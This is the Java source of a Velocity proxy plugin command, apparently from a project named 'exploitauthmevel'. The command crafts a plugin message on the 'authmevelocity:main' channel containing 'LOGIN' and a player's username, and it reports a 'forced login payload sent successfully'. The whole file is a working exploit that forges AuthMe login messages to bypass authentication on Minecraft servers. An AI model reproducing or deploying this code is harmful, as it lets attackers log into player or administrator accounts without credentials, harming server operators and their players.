package dev.wrrulos.exploitauthmevel.commands;

import com.velocitypowered.api.command.CommandSource;
import com.velocitypowered.api.command.SimpleCommand;
import com.velocitypowered.api.proxy.Player;
import com.velocitypowered.api.proxy.messages.MinecraftChannelIdentifier;
import dev.wrrulos.exploitauthmevel.Exploitauthmevel;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

public class ExploitCommand implements SimpleCommand {
    public static final MinecraftChannelIdentifier IDENTIFIER = MinecraftChannelIdentifier.from("authmevelocity:main");

    /**
     * Executes the command.
     *
     * @param invocation the invocation
     */
    @Override
    public void execute(Invocation invocation) {
        // Get the source and arguments
        CommandSource source = invocation.source();

        // Check if the source is a player
        if (!(source instanceof Player player)) {
            Component message = Component.text(Exploitauthmevel.PREFIX + "This command can only be executed by a player.", NamedTextColor.RED);
            source.sendMessage(message);
            return;
        }

        // Create a new byte array output stream
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(b);

        try {
            // Write the payload to the output stream
            out.writeUTF("LOGIN");
            out.writeUTF(player.getUsername());

            // Send the payload to the server
            player.getCurrentServer().ifPresent(server -> {
                server.sendPluginMessage(IDENTIFIER, b.toByteArray());
            });
        } catch (IOException e) {
            Component message = Component.text(Exploitauthmevel.PREFIX + "An error occurred while sending the payload", NamedTextColor.RED);
            player.sendMessage(message);
            System.err.println("An error occurred while sending the payload: " + e.getMessage());
            return;
        }
        Component message = Component.text(Exploitauthmevel.PREFIX + "Forced login payload sent successfully", NamedTextColor.GREEN);
        player.sendMessage(message);
    }
}
